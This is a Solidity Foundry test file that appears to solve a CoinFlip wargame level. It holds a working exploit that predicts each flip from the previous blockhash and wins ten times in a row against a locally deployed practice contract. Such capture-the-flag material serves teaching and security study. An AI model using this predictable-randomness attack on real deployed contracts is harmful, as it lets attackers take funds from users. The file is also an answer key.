// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "tests/Test.sol";
import "../../src/CoinFlip/Level.sol";
import "forge-std/console.sol";
import "../../src/utils/SafeMath.sol";

interface ICoinFlip {
    function flip(bool) external returns (bool);

    function consecutiveWins() external returns (uint256);
}

contract CoinFlipTest is Test {
    using SafeMath for uint256;
    ICoinFlip coinflip;

    address deployer = address(100);
    address attacker = address(101);

    function setUp() public {
        vm.prank(deployer); // deploy the contract as deployer
        coinflip = ICoinFlip(address(new CoinFlip()));
    }

    function testAttack() public {
        /* Setup stuff, no need to touch */
        vm.startPrank(attacker);
        vm.deal(attacker, 5 ether);

        /* Write your code here */
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 lastHash;
        for (uint256 i; i < 10; i++) {
            uint256 blockValue = uint256(blockhash(block.number.sub(1)));
            require(blockValue != lastHash, "Same block");
            lastHash = blockValue;
            uint256 coinFlip = blockValue.div(FACTOR);
            bool side = coinFlip == 1 ? true : false;
            console.log(side);
            coinflip.flip(side);
            vm.roll(block.number.add(1));
        }
        /* Write your code here */ 

        /* Validating the test */
        assertGe(coinflip.consecutiveWins(), 10);
    }

}
